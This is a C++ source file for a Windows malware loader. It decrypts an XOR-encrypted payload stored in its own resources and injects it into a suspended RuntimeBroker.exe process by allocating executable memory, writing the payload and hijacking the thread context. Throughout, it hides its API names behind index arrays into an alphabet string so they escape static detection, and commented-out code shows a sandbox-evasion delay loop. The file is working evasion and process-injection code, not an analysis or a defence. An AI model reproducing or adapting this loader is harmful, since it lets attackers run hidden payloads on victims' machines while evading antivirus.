#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>
#include <string>  // Include this for std::string
//CreateProcessA , VirtualAllocEx , WriteProcessMemory ,ResumeThread ,GetModuleHandle ,LoadResource.
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "user32.lib")

// Function that performs the main logic when i == 1
std::string getoriginal(int offsets[], char* big_string, int sizeof_offset){  // Use std::string
    std::string empty_string= "";
    for (int i = 0; i < sizeof_offset / 4; ++i) {
         char character = big_string[offsets[i]];
         empty_string += character;
     }
     return empty_string;
}

void main_star() {

    HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");
    char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int creatingprocess[] = {28, 17, 4, 0, 19, 4, 41, 17, 14, 2, 4, 18, 18, 26};
    int virall[] ={ 47, 8, 17, 19, 20, 0, 11, 26, 11, 11, 14, 2, 30, 23 };
    int wrproc[] = { 48, 17, 8, 19, 4, 41, 17, 14, 2, 4, 18, 18, 38, 4, 12, 14, 17, 24};
    int reth[] = {43, 4, 18, 20, 12, 4, 45, 7, 17, 4, 0, 3};
    
    int afindres[] = {31, 8, 13, 3, 43, 4, 18, 14, 20, 17, 2, 4};
    int load_resource_ok[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
    int get_mod_handle_ok[] = {32, 4, 19, 38, 14, 3, 20, 11, 4, 33, 0, 13, 3, 11, 4};
    FARPROC pFind_Resource = GetProcAddress(istfromKernel32,getoriginal(afindres, big_string, sizeof(afindres)).c_str());
    FARPROC pget_mod_handle_ok = GetProcAddress(istfromKernel32, getoriginal(get_mod_handle_ok, big_string, sizeof(get_mod_handle_ok)).c_str());
    FARPROC pLoad_Resource = GetProcAddress(istfromKernel32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
    
    char* ke;
    DWORD keLen;
    //HMODULE hModule = GetModuleHandle(NULL);
    HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pget_mod_handle_ok)(NULL);
    HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFind_Resource)(hModule, "dhanushkey1", RT_RCDATA);
    //HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
    //HGLOBAL resrdata = LoadResource(hModule, hResource);
    HGLOBAL resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
    keLen = SizeofResource(hModule, hResource);
    ke = (char*)LockResource(resrdata);

    // Load the second resource (dhanushcode56)
    char* code199k;
    DWORD code199kLen;
    //hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
    hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFind_Resource)(hModule, "dhanushcode56", RT_RCDATA);
    //resrdata = LoadResource(hModule, hResource);
    resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
    code199kLen = SizeofResource(hModule, hResource);
    code199k = (char*)LockResource(resrdata);
    
 
    printf("\n");
    std::cout << getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  // Use std::cout
    
    const char* processptaah = "c:\\windows\\system32\\RuntimeBroker.exe";

    STARTUPINFO li = {0};
    

    BOOL (*itscreatetPro)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes,
                          BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo,
                          LPPROCESS_INFORMATION lpProcessInformation) = 
        (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(istfromKernel32, getoriginal(creatingprocess, big_string, sizeof(creatingprocess)).c_str());

    LPVOID (*pvirall)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) = 
        (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD)) GetProcAddress(istfromKernel32, getoriginal(virall, big_string, sizeof(virall)).c_str());

    BOOL (*pwrproc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) = 
        (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*)) GetProcAddress(istfromKernel32, getoriginal(wrproc, big_string, sizeof(wrproc)).c_str());

    PROCESS_INFORMATION pi = {0};
    li.cb = sizeof(li);

    itscreatetPro(processptaah, 0, 0, 0, FALSE, CREATE_SUSPENDED, 0, 0, &li, &pi);
    GetTickCount();

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    
    
    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "GetThreadContext");
    pGetThreadContext(pi.hThread, &ctx);

    LPVOID gallio = pvirall(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    for (DWORD i = 0; i < code199kLen; i++) {
        code199k[i] ^= ke[i % keLen];
    }
    pwrproc(pi.hProcess, gallio, code199k, code199kLen, NULL);
    ctx.Rcx = (DWORD64)gallio;

    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKernel32, "SetThreadContext");
    pSetThreadContext(pi.hThread, &ctx);

    auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKernel32, getoriginal(reth, big_string, sizeof(reth)).c_str());
    pResumeThread(pi.hThread); 
}

int main() {
    //unsigned long long i = 0;  // Change this value to control the flow

    //for(; i < 189642300000; i++) {
        //i += i % 0xff; 
    //}
    //printf("%llu\n", i);
    
    //if (i == 189642300001){
        main_star();
    //}

    return 0;
}
